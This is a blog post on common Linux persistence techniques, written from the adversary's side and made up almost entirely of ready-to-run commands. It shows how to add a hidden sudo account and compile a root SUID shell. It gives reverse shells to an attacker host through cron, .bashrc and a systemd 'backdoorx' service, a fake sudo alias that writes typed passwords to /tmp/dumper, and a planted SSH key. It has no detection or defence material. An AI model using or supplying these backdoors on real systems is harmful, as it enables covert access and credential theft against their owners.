---
layout: single
title: "Common Linux Persistence Techniques"
excerpt: "The adversary is attempting to keep their foothold.
Persistence refers to strategies used by adversaries to maintain access to systems despite restarts, changing credentials, and other disruptions that may terminate their access. "
date: 2021-11-10 00:22:00 -0000
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: 
categories: linux
permalink: /linux/persistence
tags: [linux, persistence]

---

# Common Linux Persistence Techniques


This post will cover a few common linux persistence techniques used by adversary to establish permanent access. This blog assumed that you have basic knowledge of linux OS such as linux service, user privilege, crontab, remote management etc. The adversary is attempting to keep their foothold.
Persistence refers to strategies used by adversaries to maintain access to systems despite restarts, changing credentials, and other disruptions that may terminate their access. 

---
## Creating privilege account

The adversary tends to create a high privilege account to maintain access on the compromised system. They usually create a user with a sudo privilege across the system.

	$ Command: 
	
	victim@server$ sudo useradd -p $(openssl passwd -1 $USERPASS) -s /bin/bash -G sudo $USERNAME
    
## Creating SUID Binary

A binary with its SUID bit set, implying that everything run by the programs will be done with that user's privileges. If the SUID binary is set with root privilege, anyone that run the binary will have access on the system with the root privilege. Below is an example of creating a SUID binary named suid00r.

	$ Command:
	
	victim@server$ tempdir="/var/tmp"
	
	victim@server$ echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $tempdir/suid00r.c
	victim@server$ gcc $tempdir/suid00r.c -o $tempdir/suid00r 2>/dev/null
	victim@server$ rm $tempdir/suid00r.c
	victim@server$ chown root:root $tempdir/suid00r
	victim@server$ chmod 4777 $tempdir/suid00r

## Creating crontab

The crontab file contains a list of tasks that you wish to execute on a regular basis, as well as the name of the command that manages them. Crontab stands for "cron table," as it executes tasks using the cron job scheduler. 

Adversary can create a reverse shell that pointing to their C2 server using crontab upon reboot. Below is a simple example of bash reverse shell as for the PoC.

	$ Command:
	
	victim@server$ echo "@reboot sleep 120 && /bin/bash -l > /dev/tcp/$ATTACKERIP/4444 0<&1 2>&1"

## Creating .bashrc backdoor

A bashrc file is a shell script file that Linux uses when starting up to load items like modules and aliases into user's profile. So, whenever the user login, the .bashrc file will load the reverse shell pointing to the adversary C2 server.

	$ Command:
	
	victim@server$ echo "(setsid bash 1>&/dev/tcp/$ATTACKERIP/5555 0>&1 & ) 2>/dev/null" >> ~/.bashrc

## Creating .bashrc alias

Same as .bashrc backdoor but it leverage linux alias. When we often need to use a single large command several times, we construct an alias for it.
Alias is a shortcut command that performs the same functions as if we typed the entire command. 

As for the PoC, we use `sudo` alias. Whenever the user type sudo command for example "`sudo netstat -plnt`", the sudo alias will load then asking for user's password and dump the plaintext password to the /tmp/dumper directory before the real sudo operation from `/usr/bin/sudo` spawn.

	$ Command:
	
	victim@server$ echo "alias sudo='echo -n "[sudo] password for "\$USER": " && read -r password && echo ""\$password"" >/tmp/dumper && /usr/bin/sudo \$@'" >> ~/.bashrc

## Creating systemd backdoor

For Linux operating systems, Systemd is a system and service manager. It includes capabilities such as parallel launch of system services at boot time, on-demand activation of daemons, and dependency-based service control logic, and is meant to be backwards compatible with SysV init scripts.

As for the PoC, we create `backdoorx` service in /etc/systemd/system/ directory. Whenever the system start and the network is ready, it will established a reverse shell to adversary C2.

	$ Command:
	
	victim@server$ SYSTEMD_NAME='backdoorx'
	
	victim@server$ cat << EOF > /etc/systemd/system/$SYSTEMD_NAME.service
	[Unit]
	After=network-online.target
	[Service]
	Type=simple
	ExecStart=/bin/bash -c "bash -i >& /dev/tcp/$ATTACKERIP/6666 0>&1"
	[Install]
	WantedBy=multi-user.target'
	EOF
	
	victim@server$ systemctl daemon-reload
	victim@server$ systemctl start $SYSTEMD_NAME.service
	victim@server$ systemctl enable $SYSTEMD_NAME.service

## Creating SSH authorized_keys

In SSH, the authorized keys file defines the SSH keys that can be used to login into the user account for whom the file is set up. It's a crucial configuration file since it sets up persistent access through SSH keys.

As for the PoC, we used adversary SSH Public Key that is placed on the server you intend to log in to.

	$ Command:
	
	victim@server$ echo 'ssh-rsa AAAAB3Nza7Y-SNIP-6v6tgj6V5Dt root@C2box' >> ~/.ssh/authorized_keys
	attacker@C2$ ssh victim@server


